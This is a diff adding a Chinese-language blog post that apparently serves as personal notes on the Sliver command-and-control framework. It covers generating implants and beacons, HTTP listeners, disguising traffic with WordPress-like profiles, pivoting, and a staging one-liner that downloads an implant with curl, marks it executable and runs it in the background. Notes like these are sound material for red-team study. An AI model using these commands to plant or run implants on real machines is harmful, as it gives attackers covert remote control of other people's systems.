@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Sliver | lyi61pd</title><meta name="author" content="lyi61pd"><meta name="copyright" content="lyi61pd"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="常用命令运行服务 虽然官方文档没提到，但是实际使用下来发现，sliver-server需要root权限，否则没法监听端口，如果使用多用户模式的话，只需要sliver-server使用root权限，sliver-client只需要普通用户权限即可  12345# 正常进入sliver-server的交互式命令行界面sliver-server# 后台跑sliver-server，适用于需要多用户的情况">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sliver">
+<meta property="og:url" content="https://lyi61pd.github.io/2025/07/30/Sliver/">
+<meta property="og:site_name" content="lyi61pd">
+<meta property="og:description" content="常用命令运行服务 虽然官方文档没提到，但是实际使用下来发现，sliver-server需要root权限，否则没法监听端口，如果使用多用户模式的话，只需要sliver-server使用root权限，sliver-client只需要普通用户权限即可  12345# 正常进入sliver-server的交互式命令行界面sliver-server# 后台跑sliver-server，适用于需要多用户的情况">
+<meta property="og:locale">
+<meta property="og:image" content="https://lyi61pd.github.io/blog_imgs/avatar.png">
+<meta property="article:published_time" content="2025-07-30T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-30T03:40:55.100Z">
+<meta property="article:author" content="lyi61pd">
+<meta property="article:tag" content="C2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lyi61pd.github.io/blog_imgs/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Sliver",
+  "url": "https://lyi61pd.github.io/2025/07/30/Sliver/",
+  "image": "https://lyi61pd.github.io/blog_imgs/avatar.png",
+  "datePublished": "2025-07-30T00:00:00.000Z",
+  "dateModified": "2025-07-30T03:40:55.100Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "lyi61pd",
+      "url": "https://lyi61pd.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/blog_imgs/avatar.png"><link rel="canonical" href="https://lyi61pd.github.io/2025/07/30/Sliver/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Sliver',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="lyi61pd" type="application/atom+xml">
+</head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/blog_imgs/banner.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lyi61pd</span></a><a class="nav-page-title" href="/"><span class="site-name">Sliver</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">Sliver</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-30T00:00:00.000Z" title="Created 2025-07-30 00:00:00">2025-07-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-30T03:40:55.100Z" title="Updated 2025-07-30 03:40:55">2025-07-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="运行服务"><a href="#运行服务" class="headerlink" title="运行服务"></a>运行服务</h2><blockquote>
+<p>虽然官方文档没提到，但是实际使用下来发现，sliver-server需要root权限，否则没法监听端口，如果使用多用户模式的话，只需要sliver-server使用root权限，sliver-client只需要普通用户权限即可</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正常进入sliver-server的交互式命令行界面</span><br><span class="line">sliver-server</span><br><span class="line"></span><br><span class="line"># 后台跑sliver-server，适用于需要多用户的情况下，但是要先生成用户的配置文件</span><br><span class="line">sliver-server daemon</span><br></pre></td></tr></table></figure>
+
+<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 生成session</span><br><span class="line">generate -b localhost --os linux --skip-symbols --debug -s temp/</span><br><span class="line"></span><br><span class="line"># 生成beacon</span><br><span class="line">generate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux</span><br><span class="line"></span><br><span class="line"># 查看生成的beacon和session</span><br><span class="line">implants</span><br><span class="line"></span><br><span class="line"># 启动http监听</span><br><span class="line">http</span><br><span class="line"></span><br><span class="line"># 查看正在监听的服务</span><br><span class="line">jobs</span><br><span class="line"></span><br><span class="line"># 查看已经拿到的session</span><br><span class="line">sessions</span><br><span class="line"></span><br><span class="line"># 查看已经拿到的beacon</span><br><span class="line">beacons</span><br><span class="line"></span><br><span class="line"># 进入某个目标进行交互</span><br><span class="line">use</span><br><span class="line"></span><br><span class="line"># 退出server</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"># 查看某个目标的信息</span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"># 查看某个beacon的响应时间信息</span><br><span class="line">beacons watch</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># 查看目标基础信息</span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"># 进入shell</span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"># 退出</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line"># 基础的文件操作、目录，通过help命令查询</span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">cd</span><br><span class="line">mv .....</span><br><span class="line"></span><br><span class="line"># 设置beacon的响应时间和抖动时间</span><br><span class="line">reconfig -i 3s -j 1s</span><br><span class="line"></span><br><span class="line"># 查看beacon的命令执行状态</span><br><span class="line">tasks</span><br><span class="line"></span><br><span class="line"># 查看beacon的某个命令执行结果</span><br><span class="line">tasks fetch</span><br><span class="line"></span><br><span class="line"># 在beacon上创建一个新的同名session连接，是在当前beacon中创建了一个goroutine线程跑session</span><br><span class="line">interactive</span><br><span class="line"></span><br><span class="line"># 启动socks5，只能在session中跑，socks5代理还不清楚怎么用，端口是在server端还是target端，需要再试试看</span><br><span class="line">socks5 start</span><br><span class="line"></span><br><span class="line"># 查看当前socks5列表</span><br><span class="line">socks5</span><br><span class="line"></span><br><span class="line"># 关闭指定socks5，需要指定id</span><br><span class="line">socks5 stop -i 1</span><br><span class="line"></span><br><span class="line"># 关停session连接，不能关beacon，并且也不是完全关，下个轮训会自动连回来</span><br><span class="line">close</span><br></pre></td></tr></table></figure>
+
+<h2 id="多用户模式"><a href="#多用户模式" class="headerlink" title="多用户模式"></a>多用户模式</h2><p>服务端，默认是<code>31337**&lt;font style=&quot;color:rgb(255, 255, 255);background-color:rgb(24, 24, 27);&quot;&gt;&lt;/font&gt;**</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new-operator --name lyi --lhost 192.168.1.66 -P all</span><br><span class="line">multiplayer</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sliver-client import lyi_192.168.1.66.cfg</span><br><span class="line">sliver-client</span><br></pre></td></tr></table></figure>
+
+<p>一般情况建议服务端配置system服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Sliver</span><br><span class="line">After=network.target</span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=3</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/bin/sliver-server daemon</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>一行命令进行配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sudo tee /etc/systemd/system/sliver-server.service &gt; /dev/null &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">[Unit]</span><br><span class="line">Description=Sliver</span><br><span class="line">After=network.target</span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=3</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/bin/sliver-server daemon</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl enable sliver-server</span><br><span class="line">sudo systemctl start sliver-server</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果用了<code>multiplayer</code>命令之后，执行<code>sliver-server daemon</code>就会报告端口已占用，这是因为sliver-server已经启用了multiplayer的job，这时候需要通过<code>jobs</code>查看对应的id，然后<code>jobs -k 2</code>来关闭multiplayer，然后就可以正常跑<code>sliver-server daemon</code>了</p>
+<h1 id="C2-Profiles"><a href="#C2-Profiles" class="headerlink" title="C2 Profiles"></a>C2 Profiles</h1><p>下载这个</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt</a></p>
+<p>然后依据这个创建c2profiles</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2profiles generate -f urls-wordpress-3.3.1.txt -n wordpress -</span><br></pre></td></tr></table></figure>
+
+<p>常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前已有的c2profiles</span><br><span class="line">c2profiles</span><br><span class="line"></span><br><span class="line">通过-C在生成beacon时指定c2profile</span><br><span class="line">generate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux -C wordpress</span><br></pre></td></tr></table></figure>
+
+<h1 id="HTTP-Payload-staging"><a href="#HTTP-Payload-staging" class="headerlink" title="HTTP Payload staging"></a>HTTP Payload staging</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">生成profile</span><br><span class="line">profiles new beacon -b localhost --os linux --skip-symbols --debug profile_test</span><br><span class="line"></span><br><span class="line">根据profile生成implant</span><br><span class="line">profiles generate profile_test</span><br><span class="line"></span><br><span class="line">设置implant对外暴露以便通过http下载</span><br><span class="line">implants stage</span><br></pre></td></tr></table></figure>
+
+<p>然后通过<code>implants</code>命令查看implant的ID，然后通过curl可以去下载payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost/test.yml?z=14274</span><br></pre></td></tr></table></figure>
+
+<p>也可以加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据profile生成implant，并且加密</span><br><span class="line">profiles stage -c gzip profile_test</span><br></pre></td></tr></table></figure>
+
+<p>后续的stage实际上就是执行类似这样的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost/nothingtoseehere.yml?c=14274 --output nothingtoseehere &amp;&amp; chmod u+x nothingtoseehere &amp;&amp; nohup ./nothingtoseehere</span><br></pre></td></tr></table></figure>
+
+<h1 id="Pivots"><a href="#Pivots" class="headerlink" title="Pivots"></a>Pivots</h1><p>pivots有两种，一种是TCP，另一种是命名管道，TCP适用所有平台，命名管道只能在windows</p>
+<p>首先通过<code>use</code>连接到session，然后执行下面命令创建tcp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pivots tcp</span><br><span class="line"></span><br><span class="line">pivots</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>background</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --tcp-pivot 127.0.0.1 --os linux</span><br></pre></td></tr></table></figure>
+
+<h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><p>可以设置简单的自动脚本，但是无法做复杂逻辑，如果要做复杂逻辑，建议还是自己写一个客户端，比如用Python写，然后通过调用服务端的gRPC接口来实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reaction set -e &quot;session-connected&quot;</span><br><span class="line"></span><br><span class="line">[*] Setting reaction to: Session Opened</span><br><span class="line"></span><br><span class="line">? Enter commands:  [Enter 2 empty lines to finish]pwd</span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Set reaction to session-connected (id: 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个设置完后，在有新的session连的时候就会自动触发这个脚本</p>
+<p>可以通过<code>reaction --help</code>命令查看都有哪些触发事件</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://lyi61pd.github.io">lyi61pd</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://lyi61pd.github.io/2025/07/30/Sliver/">https://lyi61pd.github.io/2025/07/30/Sliver/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/C2/">C2</a></div><div class="post-share"><div class="social-share" data-image="/blog_imgs/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/07/%E6%B1%87%E7%BC%96/" title="汇编"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">汇编</div></div><div class="info-2"><div class="info-item-1">针对amd架构的汇编有Intel和AT&amp;T两种语法， 下面的介绍都是以Intel语法为主进行说明，主要是针对的系统是System V ABI，Linux，也是目前主流的情况 寄存器通用寄存器   名称 用途简述    RAX 主累加器（函数返回值）   RBX 基址寄存器   RCX 循环计数、参数寄存器   RDX 乘法&#x2F;除法辅助、参数   RSI 源索引（字符串操作）   RDI 目标索引，函数第一个参数   RBP 栈基址（Base Pointer）   RSP 栈顶指针（Stack Pointer）   R8 新增参数寄存器   R9 新增参数寄存器   R10 通用   R11 通用   R12 通用   R13 通用   R14 通用   R15 通用   特殊的寄存器   寄存器 说明    RIP 指令指针寄存器（程序计数器）   RSP 栈顶指针   RBP 栈帧基址   RFLAGS 状态标志寄存器   位宽访问每个 64 位寄存器都可以访问其低位部分。以 RAX...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/08/C2/" title="C2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-08</div><div class="info-item-2">C2</div></div><div class="info-2"><div class="info-item-1">C2基础什么是 C2 框架C2（Command &amp; Control）框架是攻击链中控制阶段的核心部分，用于红队与植入目标主机的木马（Agent&#x2F;Beacon）之间建立通信，执行命令、收集信息、上传下载文件、做横向移动等等。C2 框架的本质是一套包含控制端（Server）与客户端（Payload&#x2F;Beacon）的通信系统。  主流 C2 框架架构设计拆解Cobalt Strike结构组成：  Team Server：C2 控制端，负责所有 Beacon 的统一管理。 Beacon：客户端的植入载荷，支持多种通信方式（HTTP、HTTPS、DNS、SMB 等）。 Aggressor Script：脚本引擎，支持行为自动化。 Client GUI：操作端，用于管理和执行命令。  特点：  Beacon 模块化强，通信协议支持自定义混淆。 强大的内存马管理与无文件攻击能力。 配合 Malleable C2 支持流量伪装成任意合法 Web 通信。  Sliver结构组成：  Server（sliver-server）：核心服务端，gRPC + TLS...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/blog_imgs/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lyi61pd</div><div class="author-info-description">Im gonna be the best dragon</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lyi61pd"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">运行服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">交互命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">多用户模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#C2-Profiles"><span class="toc-number">2.</span> <span class="toc-text">C2 Profiles</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-Payload-staging"><span class="toc-number">3.</span> <span class="toc-text">HTTP Payload staging</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pivots"><span class="toc-number">4.</span> <span class="toc-text">Pivots</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Script"><span class="toc-number">5.</span> <span class="toc-text">Script</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/30/Sliver/" title="Sliver">Sliver</a><time datetime="2025-07-30T00:00:00.000Z" title="Created 2025-07-30 00:00:00">2025-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a><time datetime="2025-07-07T00:00:00.000Z" title="Created 2025-07-07 00:00:00">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/30/Git/" title="Git">Git</a><time datetime="2025-06-30T00:00:00.000Z" title="Created 2025-06-30 00:00:00">2025-06-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/22/Python/" title="Python">Python</a><time datetime="2025-04-22T00:00:00.000Z" title="Created 2025-04-22 00:00:00">2025-04-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/17/CVE-2021-3156/" title="CVE-2021-3156">CVE-2021-3156</a><time datetime="2025-04-17T00:00:00.000Z" title="Created 2025-04-17 00:00:00">2025-04-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/blog_imgs/banner.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By lyi61pd</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" 